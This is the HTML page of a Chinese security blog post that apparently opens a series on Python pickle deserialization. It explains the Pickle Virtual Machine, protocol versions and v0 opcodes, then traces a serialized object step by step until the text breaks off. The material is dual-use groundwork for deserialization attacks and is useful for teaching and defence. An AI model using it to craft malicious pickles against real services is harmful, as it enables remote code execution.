@@ -1,0 +1,1285 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="居家隔离实在是太无聊了，更一篇文章吧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SecMap - 反序列化（Python）">
+<meta property="og:url" content="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="居家隔离实在是太无聊了，更一篇文章吧。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/defaultcover.jpeg/cover">
+<meta property="article:published_time" content="2022-02-03T18:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-15T15:55:34.517Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SecMap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/defaultcover.jpeg/cover">
+  
+  
+  
+  <title>SecMap - 反序列化（Python） - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SecMap - 反序列化（Python）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-02-03 18:00" pubdate>
+          2022年2月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          27k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          169 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(84)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SecMap - 反序列化（Python）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>居家隔离实在是太无聊了，更一篇文章吧。</p>
+<span id="more"></span>
+<h2 id="介绍">介绍</h2>
+<p>与 PHP 反序列化类似，Python 反序列化也是为了解决对象传输与持久化存储问题。</p>
+<h3 id="相关库和方法">相关库和方法</h3>
+<p>在 Python 中内置了标准库 <code>pickle</code>/<code>cPickle</code>（3.x 改名为 <code>_pickle</code>），用于序列化/反序列化的各种操作（Python 的官方文档中，称其为 封存/解封，意思其实差不多），比较常见的当然是 <code>dumps</code>（序列化）和 <code>loads</code>（反序列化）啦。其中 <code>pickle</code> 是用 Python 写的，<code>cPickle</code> 是用 C 语言写的，速度很快，但是它不允许用户从 <code>pickle</code> 派生子类。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.a = <span class="hljs-number">1</span><br><br><br>test = Test()<br><br>serialized = pickle.dumps(test)<br><span class="hljs-built_in">print</span>(serialized)<br><br>unserialized = pickle.loads(serialized)<br><span class="hljs-built_in">print</span>(unserialized.a)<br></code></pre></td></tr></table></figure>
+<p>结果如下：<br />
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;<span class="hljs-char escape_">\x</span>80<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>95&quot;<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>08__main__<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>04Test<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>94)<span class="hljs-char escape_">\x</span>81<span class="hljs-char escape_">\x</span>94&#125;<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>8c<span class="hljs-char escape_">\x</span>01a<span class="hljs-char escape_">\x</span>94K<span class="hljs-char escape_">\x</span>01sb.&#x27;</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></p>
+<p>第一行看起来很复杂？马上说到。</p>
+<h3 id="pvm">PVM</h3>
+<p>要对序列化、反序列化很清楚的话，一定要了解 PVM，这背后又有非常多的细节。</p>
+<p>首先，在调用 pickle 的时候，实际上是 <code>class pickle.Pickler</code> 和 <code>class pickle.Unpickler</code> 在起作用，而这两个类又是依靠 Pickle Virtual Machine(PVM)，在更深层对输入进行着某种操作，从而最后得到了那串复杂的结果。</p>
+<p>PVM 由三部分组成：</p>
+<ol type="1">
+<li>指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 这个结束符后停止（看上面的代码示例，序列化之后的结果最后是 <code>.</code>）。最终留在栈顶的值将被作为反序列化对象返回。需要注意的是：
+<ol type="1">
+<li>opcode 是单字节的</li>
+<li>带参数的指令用换行符来确定边界</li>
+</ol></li>
+<li>栈区：用 list 实现的，被用来临时存储数据、参数以及对象。</li>
+<li>内存区：用 dict 实现的，为 PVM 的整个生命周期提供存储。</li>
+</ol>
+<p>最后，PVM 还有协议一说，这里的协议指定了应该采用什么样的序列化、反序列化算法。</p>
+<h4 id="pvm-协议">PVM 协议</h4>
+<p>当前共有 6 种不同的协议可用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新。</p>
+<ol type="1">
+<li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python</li>
+<li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容</li>
+<li>v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）。</li>
+<li>v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。</li>
+<li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议。</li>
+<li>v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）。</li>
+</ol>
+<p>上面那个代码示例，我用的是 py3.8，如果要得到易读的序列化结果，在 dumps 中指定协议版本即可：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.a = <span class="hljs-number">1</span><br><br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)  <span class="hljs-comment"># 指定版本</span><br><span class="hljs-built_in">print</span>(serialized)<br><br>unserialized = pickle.loads(serialized)  <span class="hljs-comment"># 注意，loads 能够自动识别反序列化的版本</span><br><span class="hljs-built_in">print</span>(unserialized.a)<br></code></pre></td></tr></table></figure><br />
+结果如下：<br />
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-string">b&#x27;ccopy_reg<span class="hljs-char escape_">\n</span>_reconstructor<span class="hljs-char escape_">\n</span>p0<span class="hljs-char escape_">\n</span>(c__main__<span class="hljs-char escape_">\n</span>Test<span class="hljs-char escape_">\n</span>p1<span class="hljs-char escape_">\n</span>c__builtin__<span class="hljs-char escape_">\n</span>object<span class="hljs-char escape_">\n</span>p2<span class="hljs-char escape_">\n</span>Ntp3<span class="hljs-char escape_">\n</span>Rp4<span class="hljs-char escape_">\n</span>(dp5<span class="hljs-char escape_">\n</span>Va<span class="hljs-char escape_">\n</span>p6<span class="hljs-char escape_">\n</span>I1<span class="hljs-char escape_">\n</span>sb.&#x27;</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></p>
+<p>在序列化时，协议版本是自动检测出来的，所以诸如 loads 方法是不需要参数来指定协议的。</p>
+<p>由于不同版本在利用的时候没有很大区别，所以本文以最易读的 v0 协议为例。</p>
+<h4 id="opcode">opcode</h4>
+<p>opcode 是 PVM 的灵魂，控制整个流程的运行。常用的我给翻译了一下，各位现查现用好了。<br />
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs txt">MARK           = b&#x27;(&#x27;   # 向栈中压入一个 MARK 标记<br>STOP           = b&#x27;.&#x27;   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值<br>POP            = b&#x27;0&#x27;   # 丢弃栈顶对象<br>POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject<br>DUP            = b&#x27;2&#x27;   # duplicate top stack item<br>FLOAT          = b&#x27;F&#x27;   # 实例化一个 float 对象<br>INT            = b&#x27;I&#x27;   # 实例化一个 int 或者 bool 对象<br>BININT         = b&#x27;J&#x27;   # push four-byte signed int<br>BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int<br>LONG           = b&#x27;L&#x27;   # push long; decimal string argument<br>BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int<br>NONE           = b&#x27;N&#x27;   # 栈中压入 None<br>PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg<br>BINPERSID      = b&#x27;Q&#x27;   # push persistent object; id is taken from stack<br>REDUCE         = b&#x27;R&#x27;   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈<br>STRING         = b&#x27;S&#x27;   # 实例化一个字符串对象<br>BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument<br>SHORT_BINSTRING= b&#x27;U&#x27;   # push string; counted binary string argument &lt; 256 bytes<br>UNICODE        = b&#x27;V&#x27;   # 实例化一个 UNICODE 字符串对象<br>BINUNICODE     = b&#x27;X&#x27;   # push Unicode string; counted UTF-8 string argument<br>APPEND         = b&#x27;a&#x27;   # 将栈的第一个元素 append 到第二个元素（必须为列表）中<br>BUILD          = b&#x27;b&#x27;   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()<br>GLOBAL         = b&#x27;c&#x27;   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈<br>DICT           = b&#x27;d&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果<br>EMPTY_DICT     = b&#x27;&#125;&#x27;   # 向栈中直接压入一个空字典<br>APPENDS        = b&#x27;e&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中<br>GET            = b&#x27;g&#x27;   # 将 memo[n] 的压入栈<br>BINGET         = b&#x27;h&#x27;   # push item from memo on stack; index is 1-byte arg<br>INST           = b&#x27;i&#x27;   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）<br>LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg<br>LIST           = b&#x27;l&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表<br>EMPTY_LIST     = b&#x27;]&#x27;   # 向栈中直接压入一个空列表<br>OBJ            = b&#x27;o&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，<br>PUT            = b&#x27;p&#x27;   # 将栈顶对象储存至 memo[n]<br>BINPUT         = b&#x27;q&#x27;   # store stack top in memo; index is 1-byte arg<br>LONG_BINPUT    = b&#x27;r&#x27;   # store stack top in memo; index is 4-byte arg<br>SETITEM        = b&#x27;s&#x27;   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中<br>TUPLE          = b&#x27;t&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果<br>EMPTY_TUPLE    = b&#x27;)&#x27;   # 向栈中直接压入一个空元组<br>SETITEMS       = b&#x27;u&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中<br>BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding<br><br>TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py<br>FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py<br></code></pre></td></tr></table></figure></p>
+<p>当然，这些都是 v0 协议的 opcode，其他版本的协议会新增/替换一些 opcode，详见资料 2。</p>
+<p>以上面那个 <code>b'ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVa\np6\nI1\nsb.'</code> 为例，我们来解读一下这个序列化结果：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">c copy_reg _reconstructor: stack[copy_reg._reconstructor]<br><br>p <span class="hljs-number">0</span>: memo[copy_reg._reconstructor]<br><br>(: stack[(, copy_reg._reconstructor]<br><br>c __main__ Test: stack[__main__.Test, (, copy_reg._reconstructor]<br><br>p <span class="hljs-number">1</span>: memo[copy_reg._reconstructor, __main__.Test]<br><br>c __builtin__ <span class="hljs-built_in">object</span>: stack[__builtin__.<span class="hljs-built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]<br><br>p <span class="hljs-number">2</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>]<br><br>N: stack[<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]<br><br>t: stack[(<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), copy_reg._reconstructor]<br><br>p <span class="hljs-number">3</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test)]<br><br>R stack[&lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">4</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>(: stack[(, &lt;__main__.Test at <span 